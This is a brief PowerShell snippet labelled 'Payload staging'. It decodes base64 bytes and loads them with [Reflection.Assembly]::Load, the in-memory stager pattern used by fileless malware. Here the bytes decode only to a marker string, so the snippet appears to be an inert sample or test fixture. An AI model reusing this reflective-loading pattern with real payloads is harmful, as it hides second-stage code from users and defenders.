
<# Payload staging #> $ManagedBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjoycDh3MWdpem9y"); Write-Verbose ("Assembly bytes: " + $ManagedBytes.Length); [Reflection.Assembly]::Load($ManagedBytes); $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"; Write-Verbose "stage marker 29 reached"
